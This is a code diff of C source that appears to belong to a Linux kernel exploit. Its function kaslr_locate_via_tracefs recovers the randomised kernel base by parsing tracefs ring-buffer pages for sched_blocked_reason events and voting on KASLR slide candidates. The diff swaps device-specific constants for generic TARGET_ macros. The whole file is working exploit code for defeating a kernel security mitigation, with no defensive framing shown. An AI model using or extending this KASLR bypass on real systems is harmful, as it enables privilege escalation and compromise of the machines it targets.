@@ -18,13 +18,9 @@
 #include <unistd.h>
 
 #include "01_kernel_base_tracefs.h"
-#include "target_zzhl.h"
+#include "target.h"
 
 #define TRACEFS_ROOT "/sys/kernel/tracing"
-
-#ifndef TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID
-#define TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID 108
-#endif
 
 static int tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -64,36 +60,34 @@ done:
 }
 
 static int validate_caller(uint64_t caller, uint64_t *candidate_out) {
-  uint64_t link_caller = ZZHL_KIMAGE_TEXT_BASE + ZZHL_WORKER_CALLER_OFF;
+  uint64_t link_caller = TARGET_KIMAGE_TEXT_BASE + TARGET_WORKER_CALLER_OFF;
   if (caller < link_caller) {
     return 0;
   }
   uint64_t candidate = caller - link_caller;
-  if (candidate > 0x1f8000ULL || (candidate & 0x7fffULL) != 0) {
+  if (candidate > TARGET_KASLR_MAX_SLIDE ||
+      (candidate & (TARGET_KASLR_ALIGNMENT - 1ULL)) != 0) {
     return 0;
   }
   *candidate_out = candidate;
   return 1;
 }
 
-#define KASLR_CANDIDATE_COUNT 64U
-#define KASLR_QUORUM 2U
-
 static int add_candidate_vote(uint64_t caller,
-                              unsigned int votes[KASLR_CANDIDATE_COUNT],
+                              unsigned int votes[TARGET_KASLR_CANDIDATE_COUNT],
                               uint64_t *candidate_out) {
   uint64_t candidate = 0;
   if (!validate_caller(caller, &candidate)) {
     return 0;
   }
-  size_t slot = (size_t)(candidate >> 15);
-  if (slot >= KASLR_CANDIDATE_COUNT) {
+  size_t slot = (size_t)(candidate / TARGET_KASLR_ALIGNMENT);
+  if (slot >= TARGET_KASLR_CANDIDATE_COUNT) {
     return 0;
   }
   if (votes[slot] < UINT32_MAX) {
     votes[slot]++;
   }
-  if (votes[slot] < KASLR_QUORUM) {
+  if (votes[slot] < TARGET_KASLR_QUORUM) {
     return 0;
   }
   *candidate_out = candidate;
@@ -101,21 +95,22 @@ static int add_candidate_vote(uint64_t caller,
 }
 
 static int parse_trace_page(const unsigned char *page, size_t page_len,
-                            unsigned int votes[KASLR_CANDIDATE_COUNT],
+                            unsigned int votes[TARGET_KASLR_CANDIDATE_COUNT],
                             uint64_t *candidate_out) {
   if (page_len < 20) {
     return 0;
   }
 
   unsigned int loose_matches = 0;
-  for (size_t pos = 0; pos + 0x18 <= page_len; pos += 4) {
+  for (size_t pos = 0; pos + TARGET_TRACE_LOOSE_RECORD_SIZE <= page_len;
+       pos += 4) {
     uint16_t event_id = 0;
     memcpy(&event_id, page + pos, sizeof(event_id));
-    if (event_id != TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID) {
+    if (event_id != TARGET_TRACE_SCHED_BLOCKED_REASON_ID) {
       continue;
     }
     uint64_t caller = 0;
-    memcpy(&caller, page + pos + 0x10, sizeof(caller));
+    memcpy(&caller, page + pos + TARGET_TRACE_CALLER_OFF, sizeof(caller));
     uint64_t candidate = 0;
     if (validate_caller(caller, &candidate)) {
       loose_matches++;
@@ -134,7 +129,7 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
 
   uint64_t commit = 0;
   memcpy(&commit, page + 8, sizeof(commit));
-  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t data_len = (size_t)(commit & TARGET_PAGE_MASK);
   size_t end = 16 + data_len;
   if (end > page_len) {
     end = page_len;
@@ -142,7 +137,7 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
   for (size_t pos = 16; pos + 4 <= end;) {
     uint32_t event_header = 0;
     memcpy(&event_header, page + pos, sizeof(event_header));
-    uint32_t type_len = event_header & 0x1fU;
+    uint32_t type_len = event_header & TARGET_TRACE_TYPE_LEN_MASK;
     if (type_len == 30) {
       pos += 8;
       continue;
@@ -161,7 +156,7 @@ static int parse_trace_page(const unsigned char *page, size_t page_len,
     }
     uint16_t event_id = 0;
     memcpy(&event_id, page + record, sizeof(event_id));
-    if (event_id == TRACEFS_SCHED_BLOCKED_REASON_EVENT_ID &&
+    if (event_id == TARGET_TRACE_SCHED_BLOCKED_REASON_ID &&
         record_len >= 24) {
       uint64_t caller = 0;
       memcpy(&caller, page + record + 16, sizeof(caller));
@@ -203,9 +198,9 @@ static uint64_t monotonic_ms(void) {
 }
 
 static int drain_trace_reader(struct trace_reader *reader,
-                              unsigned int votes[KASLR_CANDIDATE_COUNT],
+                              unsigned int votes[TARGET_KASLR_CANDIDATE_COUNT],
                               uint64_t *candidate_out) {
-  unsigned char page[4096];
+  unsigned char page[TARGET_PAGE_SIZE];
   for (;;) {
     ssize_t got = read(reader->fd, page, sizeof(page));
     if (got > 0) {
@@ -279,7 +274,7 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
   fprintf(stderr, "[kaslr] sampling sched_blocked_reason up to %dms\n",
           wait_ms);
   uint64_t candidate = 0;
-  unsigned int votes[KASLR_CANDIDATE_COUNT] = {0};
+  unsigned int votes[TARGET_KASLR_CANDIDATE_COUNT] = {0};
   int found = 0;
   uint64_t started_ms = monotonic_ms();
   uint64_t deadline_ms = started_ms + (uint64_t)wait_ms;
@@ -327,18 +322,18 @@ int kaslr_locate_via_tracefs(uint64_t *kernel_base_out) {
 
   if (!found) {
     unsigned int best = 0;
-    for (size_t i = 0; i < KASLR_CANDIDATE_COUNT; i++) {
+    for (size_t i = 0; i < TARGET_KASLR_CANDIDATE_COUNT; i++) {
       if (votes[i] > best) {
         best = votes[i];
       }
     }
     fprintf(stderr,
             "[kaslr] worker_thread quorum not reached best=%u required=%u\n",
-            best, KASLR_QUORUM);
+            best, TARGET_KASLR_QUORUM);
     return 0;
   }
 
-  *kernel_base_out = ZZHL_KIMAGE_TEXT_BASE + candidate;
+  *kernel_base_out = TARGET_KIMAGE_TEXT_BASE + candidate;
   fprintf(stderr,
           "[kaslr] source=tracefs base=%016llx slide=%016llx "
           "p0_offset=%08llx votes=%u sample_ms=%llu\n",
